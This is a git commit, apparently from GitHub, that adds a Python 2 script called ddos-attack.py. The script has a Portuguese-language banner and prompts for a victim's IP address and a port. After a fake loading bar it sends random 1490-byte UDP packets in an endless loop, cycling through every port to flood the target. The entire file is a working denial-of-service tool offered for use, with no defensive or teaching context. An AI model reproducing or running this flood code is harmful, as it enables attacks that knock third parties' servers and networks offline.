6e3f4299aa228fcb52b03df6b73a117e7d377ba3
Tmods999 <73153847+Tmods999@users.noreply.github.com>
2020-10-20 01:23:51 -0300

    Add files via upload

---
+++ ddos-attack.py
@@ -0,0 +1,50 @@
+import sys
+import os
+import time
+import socket
+import random
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+os.system("clear")
+os.system("figlet DDos Attack")
+print
+print "CRIADOR  : TMODS OFICIAL"
+print "You Tube :https://www.youtube.com/channel/UC-hoG73HIkACGAjhv55id5Q"
+print
+ip = raw_input("IP DA VÍTIMA : ")
+port = input("Porta       : ")
+
+os.system("clear")
+os.system("figlet Attack Starting")
+print "[                    ] LOADING. "
+time.sleep(5)
+print "[=====               ] LOADING.."
+time.sleep(5)
+print "[==========          ] LOADING..."
+time.sleep(5)
+print "[===============     ] LOADING...."
+time.sleep(5)
+print "[====================] CARREGADO!"
+time.sleep(3)
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
+
+
